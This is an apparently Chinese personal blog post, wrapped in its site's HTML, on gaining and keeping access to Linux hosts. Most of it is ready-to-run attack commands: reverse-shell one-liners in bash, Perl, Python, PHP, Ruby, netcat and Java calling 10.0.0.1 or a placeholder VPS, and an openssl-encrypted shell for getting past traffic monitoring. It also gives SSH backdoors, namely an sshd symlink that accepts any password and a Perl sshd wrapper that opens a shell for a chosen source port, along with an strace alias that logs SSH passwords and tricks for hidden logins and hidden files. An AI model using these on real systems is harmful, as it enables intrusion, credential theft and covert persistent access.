@@ -1,0 +1,1969 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="权限维持方法, Youngboy,github">
+    <meta name="description" content="北冥有鱼，其名为鲲，鲲之大，不知其几千里也； 化而为鸟，其名为鹏.">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>权限维持方法 | Young&#39;s Blogs</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Young's Blogs</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Young's Blogs</div>
+        <div class="logo-desc">
+            
+            北冥有鱼，其名为鲲，鲲之大，不知其几千里也； 化而为鸟，其名为鹏.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/youngboy-lab" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/youngboy-lab" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '18350405381';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">权限维持方法</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Linux/" class="post-category">
+                                Linux
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-07-30
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-07-30
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    5.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    25 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="0X01-获得初始权限"><a href="#0X01-获得初始权限" class="headerlink" title="0X01 获得初始权限"></a>0X01 获得初始权限</h2><p>Linux有很多种反弹shell的方法,反弹shell的好处主要是操作过程中会更加方便,对我个人来说,主要是命令补全,总之,从权限维持的角度来说,可以更好的去执行一些操作.</p>
+<p>能否反弹shell,要根据目标的环境来尝试,有可能bash无法直接反弹,但是python却可以成功,还要注意白名单问题.</p>
+<p>实验环境准备直接用Kali,记得做好快照.</p>
+<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p>bash</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/10.0.0.1/8080 0<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i 5<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/host/port 0<span class="token operator">></span><span class="token operator">&amp;</span>5 1<span class="token operator">></span><span class="token operator">&amp;</span>5</code></pre>
+<p>参考资料:<br>bash反弹shell原理解析<br>[<a href="https://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/]" target="_blank" rel="noopener">https://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/]</a>(<a href="https://www.00theway.org/2017/07/11/bash" target="_blank" rel="noopener">https://www.00theway.org/2017/07/11/bash</a> 反弹shell/)</p>
+<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><p>bash</p>
+<pre class=" language-bash"><code class="language-bash">perl -e <span class="token string">'use Socket;<span class="token variable">$i</span>="10.0.0.1";<span class="token variable">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(<span class="token variable">$p</span>,inet_aton(<span class="token variable">$i</span>)))){open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");};'</span></code></pre>
+<h3 id="URL-Encoded-Perl-Linux"><a href="#URL-Encoded-Perl-Linux" class="headerlink" title="URL-Encoded Perl: Linux"></a>URL-Encoded Perl: Linux</h3><p>bash</p>
+<pre class=" language-bash"><code class="language-bash">echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew</code></pre>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>bash</p>
+<pre class=" language-bash"><code class="language-bash">php -r <span class="token string">'<span class="token variable">$sock</span>=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span></code></pre>
+<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><p>bash</p>
+<pre class=" language-bash"><code class="language-bash">ruby -rsocket -e<span class="token string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)'</span></code></pre>
+<h3 id="Netcat-without-e-1"><a href="#Netcat-without-e-1" class="headerlink" title="Netcat without -e #1"></a>Netcat without -e #1</h3><p>mkfifo函数只是创建一个FIFO文件，要使用命名管道将其打开。</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">cat</span> /tmp/f <span class="token operator">|</span> /bin/sh -i 2<span class="token operator">></span><span class="token operator">&amp;</span>1 <span class="token operator">|</span> nc 10.0.0.1 1234 <span class="token operator">></span> /tmp/f</code></pre>
+<h3 id="Netcat-without-e-2"><a href="#Netcat-without-e-2" class="headerlink" title="Netcat without -e #2"></a>Netcat without -e #2</h3><p>bash</p>
+<pre class=" language-bash"><code class="language-bash">nc localhost 443 <span class="token operator">|</span> /bin/sh <span class="token operator">|</span> nc localhost 444
+telnet localhost 443 <span class="token operator">|</span> /bin/sh <span class="token operator">|</span> telnet localhost 444</code></pre>
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>bash</p>
+<pre class=" language-bash"><code class="language-bash">r <span class="token operator">=</span> Runtime.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> p <span class="token operator">=</span> r.exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span>,<span class="token string">"-c"</span>,<span class="token string">"exec 5&lt;>/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \<span class="token variable">$line</span> 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> p.waitFor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<h3 id="Xterm"><a href="#Xterm" class="headerlink" title="Xterm"></a>Xterm</h3><p>c</p>
+<pre class=" language-c"><code class="language-c">xterm <span class="token operator">-</span>display <span class="token number">10.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">1</span></code></pre>
+<h3 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h3><p>bash</p>
+<pre class=" language-bash"><code class="language-bash">0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>196<span class="token punctuation">;</span><span class="token function">exec</span> 196<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/<span class="token operator">&lt;</span>your_vps<span class="token operator">></span>/1024<span class="token punctuation">;</span> sh <span class="token operator">&lt;</span><span class="token operator">&amp;</span>196 <span class="token operator">></span><span class="token operator">&amp;</span>196 2<span class="token operator">></span><span class="token operator">&amp;</span>196</code></pre>
+<p>思考:假设渗透过程中,发现目标环境无法反弹shell,最后测试得出只开放了80和443.通过白名单反弹shell时又发现流量被拦截了,如何应对这种情况?</p>
+<p>可以尝试通过加密数据包的方式来逃避流量监控设备.</p>
+<p>第一步:<br>在VPS 上生成 SSL 证书的公钥/私钥对：</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre>
+<p>第二步:<br>VPS 监听反弹 shell：</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash">openssl s_server -quiet  -key key.pem -cert cert.pem -port 443</code></pre>
+<p>第三步:<br>连接:</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">mkfifo</span> /tmp/wing<span class="token punctuation">;</span>/bin/bash -i <span class="token operator">&lt;</span> /tmp/wing 2<span class="token operator">></span><span class="token operator">&amp;</span>1 <span class="token operator">|</span>openssl s_client -quiet -connect 1.1.1.1:443 <span class="token operator">></span> /tmp/wing</code></pre>
+<p>获得shell</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ubmxhcmsuY29tL3l1cXVlLzAvMjAxOS9wbmcvMzcwOTE5LzE1Njc3MDM3Njk1OTQtNWQ1YWFmMDItZGUyZS00YmM2LTk2YzgtMWVkYTRkNTA4MWI5LnBuZw?x-oss-process=image/format,png#align=left&display=inline&height=138&name=image.png&originHeight=276&originWidth=1252&size=50680&status=done&width=626" alt="image.png"></p>
+<p><strong>image.png</strong></p>
+<p>但这时你会发现,这个shell不太好用,没有基本的命令补全.</p>
+<p>解决方法:</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>
+<p>pty是一个伪终端模块</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash">pty.spawn<span class="token punctuation">(</span>argv<span class="token punctuation">[</span>, master_read<span class="token punctuation">[</span>, stdin_read<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+产生一个进程，并将其控制终端与当前进程的标准io连接。这通常用于阻挡坚持从控制终端读取的程序。
+
+函数 master_read 和 stdin_read 应该是从文件描述符读取的函数。默认值尝试在每次调用时读取1024字节。
+
+在 3.4 版更改: spawn<span class="token punctuation">(</span><span class="token punctuation">)</span> 现在从子进程的 os.waitpid<span class="token punctuation">(</span><span class="token punctuation">)</span> 返回状态值</code></pre>
+<p>有时候提权以后终端也是会出现类似问题,一般这个方法可以解决.</p>
+<p>或者参考后面的链接</p>
+<h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><p>bash</p>
+<pre class=" language-bash"><code class="language-bash">socat file:<span class="token variable"><span class="token variable">`</span><span class="token function">tty</span><span class="token variable">`</span></span>,raw,echo<span class="token operator">=</span>0 tcp-listen:9999
+
+把socat上传到目标机器上，然后执行：
+socat exec:<span class="token string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:111.111.111.111:9999</code></pre>
+<p>也可以得到一个交互式shell</p>
+<p>知识点来源于</p>
+<p>将简单的shell升级为完全交互式的TTY<br><a href="https://www.4hou.com/technology/6248.html" target="_blank" rel="noopener">https://www.4hou.com/technology/6248.html</a></p>
+<p>全程带阻：记一次授权网络攻防演练（下）<br><a href="https://www.freebuf.com/vuls/211847.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/211847.html</a></p>
+<h2 id="0X02-权限维持技术"><a href="#0X02-权限维持技术" class="headerlink" title="0X02 权限维持技术"></a>0X02 权限维持技术</h2><h2 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h2><h3 id="SSH软连接"><a href="#SSH软连接" class="headerlink" title="SSH软连接"></a>SSH软连接</h3><p>bash</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">ln</span> -sf /usr/sbin/sshd /tmp/su<span class="token punctuation">;</span> /tmp/su -oPort<span class="token operator">=</span>5555<span class="token punctuation">;</span></code></pre>
+<p>建立一个软连接，然后通过5555端口访问ssh服务</p>
+<p>正常的登陆功能</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODEwNjA3MTc1NjIuanBn?x-oss-process=image/format,png" alt="-w1024"></p>
+<p><strong>-w1024</strong></p>
+<p>添加用户</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">useradd</span> wing -p wing</code></pre>
+<p>ssh连接时密码任意输入，kali测试时，root也可以。</p>
+<p>具体原理见<a href="http://www.91ri.org/16803.html" target="_blank" rel="noopener">Linux的一个后门引发对PAM的探究</a></p>
+<h3 id="SSH-Wrapper"><a href="#SSH-Wrapper" class="headerlink" title="SSH Wrapper"></a>SSH Wrapper</h3><p>Exploit:</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/sbin/
+<span class="token function">mv</span> sshd <span class="token punctuation">..</span>/bin/
+<span class="token keyword">echo</span> <span class="token string">'#!/usr/bin/perl'</span> <span class="token operator">></span>sshd
+<span class="token keyword">echo</span> <span class="token string">'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);'</span> <span class="token operator">>></span>sshd
+<span class="token keyword">echo</span> <span class="token string">'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,'</span> <span class="token operator">>></span>sshd
+<span class="token function">chmod</span> u+x sshd
+/etc/init.d/sshd restart</code></pre>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODE4MDkwMjEzNDEuanBn?x-oss-process=image/format,png" alt="-w653"></p>
+<p><strong>-w653</strong></p>
+<p>然后连接：</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash">socat STDIO TCP4:target_ip:22,sourceport<span class="token operator">=</span>13377</code></pre>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODE4MDg3NjUxMDUuanBn?x-oss-process=image/format,png" alt="-w951"></p>
+<p><strong>-w951</strong></p>
+<p>原理：</p>
+<blockquote>
+<p>init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。<br>来自<a href="https://www.anquanke.com/post/id/155943#h2-9" target="_blank" rel="noopener">https://www.anquanke.com/post/id/155943#h2-9</a></p>
+</blockquote>
+<h3 id="SSH-key的写入"><a href="#SSH-key的写入" class="headerlink" title="SSH key的写入"></a>SSH key的写入</h3><p>本地先生成ssh key</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash">ssh-keygen -t rsa</code></pre>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODEzNTU1Nzc4MDIuanBn?x-oss-process=image/format,png" alt="-w729"></p>
+<p><strong>-w729</strong></p>
+<p>再把公钥id_rsa.pub发送到目标上</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODEzNTU5OTUxNDYuanBn?x-oss-process=image/format,png" alt="-w1002"></p>
+<p><strong>-w1002</strong></p>
+<p>同时赋予权限，但是权限不能过大。</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> 600 ~/.ssh/authorized_keys
+<span class="token function">chmod</span> 700 ~/.ssh</code></pre>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODEzNTY2NzYwOTguanBn?x-oss-process=image/format,png" alt="-w882"></p>
+<p><strong>-w882</strong></p>
+<h3 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a>SSH keylogger</h3><p>在当前用户配置文件末尾添加</p>
+<pre><code>alias ssh=&#39;strace -o /tmp/sshpwd-`date    &#39;+%d%h%m%s&#39;`.log -e read,write,connect  -s2048 ssh&#39;</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODE4MTQyMzA4MDUuanBn?x-oss-process=image/format,png" alt="-w651"></p>
+<p><strong>-w651</strong></p>
+<h3 id="Openssh-Rookit"><a href="#Openssh-Rookit" class="headerlink" title="Openssh Rookit"></a>Openssh Rookit</h3><p>需要安装环境依赖，可用性不是很高，参考<a href="https://www.cnblogs.com/bigdevilking/p/9535427.html" target="_blank" rel="noopener">利用Openssh后门 劫持root密码</a></p>
+<h3 id="SSH隐身登录"><a href="#SSH隐身登录" class="headerlink" title="SSH隐身登录"></a>SSH隐身登录</h3><p>隐身登录<br>隐身登录系统，不会被last who w等指令检测到</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -T username@host /bin/bash -i
+
+<span class="token function">ssh</span> -o UserKnownHostsFile<span class="token operator">=</span>/dev/null -T user@host 
+/bin/bash -if</code></pre>
+<h2 id="Linux隐藏技术"><a href="#Linux隐藏技术" class="headerlink" title="Linux隐藏技术"></a>Linux隐藏技术</h2><h3 id="简单的隐藏文件"><a href="#简单的隐藏文件" class="headerlink" title="简单的隐藏文件"></a>简单的隐藏文件</h3><p>bash</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">touch</span> .wing.py</code></pre>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI2OTY5NzUwODMuanBn?x-oss-process=image/format,png" alt="-w906"></p>
+<p>可以找一些目录隐藏自己的恶意文件</p>
+<h3 id="隐藏权限"><a href="#隐藏权限" class="headerlink" title="隐藏权限"></a>隐藏权限</h3><p>chattr命令可以给文件加<code>锁</code>，防止被删除，我们也可以将它利用起来</p>
